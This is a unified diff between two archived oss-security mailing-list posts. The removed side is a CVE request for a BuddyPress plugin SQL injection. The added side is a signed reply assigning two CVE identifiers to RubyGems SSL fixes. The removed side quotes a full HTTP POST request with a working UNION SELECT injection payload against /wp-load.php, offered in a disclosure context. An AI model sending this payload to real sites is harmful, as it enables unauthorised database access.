@@ -1,40 +1,74 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/15/2
-Message-ID: <20120415090537.GA25137@kludge.henri.nerv.fi>
-Date: Sun, 15 Apr 2012 12:05:37 +0300
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/20/24
+Message-ID: <4F918108.8060309@redhat.com>
+Date: Fri, 20 Apr 2012 09:30:16 -0600
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-request: WordPress BuddyPress-plugin SQL-injection 1.5.4
+CC: Jan Lieskovsky <jlieskov@...hat.com>, "Steven M. Christey" <coley@...us.mitre.org>, Eric Hodel <drbrain@...ment7.net>, Evan Phoenix <evan@....io>, Vít Ondruch <vondruch@...hat.com>
+Subject: Re: CVE Request -- rubygems: Two security fixes in upstream v1.8.23 version
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Can I get 2012 CVE-identifier for WordPress BuddyPress-plugin SQL-injection.
+On 04/20/2012 09:01 AM, Jan Lieskovsky wrote:
+> Hello Kurt, Steve, Eric, Evan, vendors,
+> 
+> two security fixes has been recently corrected in upstream 
+> rubygems-v1.8.23 version: #1 RubyGems now disallows redirection
+> from HTTPS to HTTP.
 
-Affected: 1.5.4
-Fixed: 1.5.5
-Vendor: http://buddypress.org/2012/03/buddypress-1-5-5/
-OSVDB: http://osvdb.org/show/osvdb/80763
-Changelog: http://codex.buddypress.org/releases/version-1-5/ (doesn't seem to say about this issue)
+Please use CVE-2012-2125 for this issue.
 
-http://seclists.org/bugtraq/2012/Apr/4
-"""
-Hi,
+> #2 RubyGems now verifies SSL connections.
 
-I would like disclosure SQL injection vulnerability if Buddypress plugin affecting last versions. This issue was 
-reported to developers and resolved in 1.5.5 version. So, I suggest all having this plugin in their blogs update to 
-last version, if you haven't done it yet. Example of POST message with sql injection is below.
+Please use CVE-2012-2126 for this issue.
 
-POST /wp-load.php HTTP/1.1
-User-Agent: Mozilla
-Host: example.com
-Accept: */*
-Referer: http://example.com/activity/?s=b
-Connection: Keep-Alive
-Content-Length: 153
-Content-Type: application/x-www-form-urlencoded
+> References: [1]
+> https://github.com/rubygems/rubygems/blob/1.8/History.txt
+> (rubygems History.txt) [2] 
+> https://github.com/rubygems/rubygems/commit/d4c7eafb8efe1e13a7abf5be5a5b4548870b15b7
+>
+>  (relevant rubygems git commit) [3] 
+> http://www.ruby-lang.org/en/news/2012/04/20/ruby-1-9-3-p194-is-released/
+>
+> 
+(Ruby v1.9.3-p194 version announcement)
+> [4] 
+> http://svn.ruby-lang.org/cgi-bin/viewvc.cgi?view=revision&sortby=date&revision=35404
+>
+>  (Ruby language SVN repository commit) [5]
+> https://bugzilla.redhat.com/show_bug.cgi?id=814718 (Red Hat
+> bugzilla entry)
+> 
+> Both of [2] and [4] patches include fixes for both issues. For the
+> case #2 the security implications are clear.
+> 
+> Kurt, could you allocate two CVE ids for these issues?
+> 
+> Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat
+> Security Response Team
 
-action=activity_widget_filter&page=1%26exclude%3d1)and(1=0)UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17))%3b--+
-"""
 
-- Henri Salo
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+
+iQIcBAEBAgAGBQJPkYEHAAoJEBYNRVNeJnmTMbYP/03p4p3JbDOIOC9D/P30uJO0
+uFUHkZRkC8/UfHgjNSzGaplIFZ38pey8/xmmkI+GeOuGRr+hPpHDfwdTGH89iiie
+txIdndsi/PWzZ1nLuZD1dJCSd4912q5VvA1fIAG8Bpl+f26wvoiZAuj3BYfUzosG
+GMuhrL98CoJqqSYaDrPnRA1w7pJgyz6xbTdwCvvqzjTp0g0SrmoSKqk5U1J7sU5x
+RJrqD4bIHZTM9EkqS+/wL+yZ9SW3ou/SjWfp6zjFz3JRwMIWKvM702EJHxPuErXx
+aiAXKRfi9T9F2YRrUILw3aHHCbnPU2+h2Wzl82+vNMZR8qB0p9zSdExY/n/FQ9PQ
+LDsyfvjBvVXxfUT8tnIF6my0k8OoZpZejzMVeywtd5zfVzSxiAGqn+f8TuquWYbf
++ByboQIgog9bh7lgQhjBkNt98PwYDdwihtK7vAQMV6XZsfJ1BA37EZ7scL5sndka
+q0p9zlNwsHMA4FfBXvaDFeJlY/VjBcQP9b9cCmXUoiMqqromUoqzEfzFng40gMFO
+cBvwW2dMGPmhrA0RN+12zFknh/dBACdstb5mNHcWlASHLpuaOIhV7joE5Bz8F5TE
+ks1YYiTB+dcGb7Zdae1XXaYd1ViVzptgyCO97PkK3TqfRLuEsVdEibLzPOK1PwoZ
+U0WNtNRpbpd7FFNXUxH9
+=jcFs
+-----END PGP SIGNATURE-----
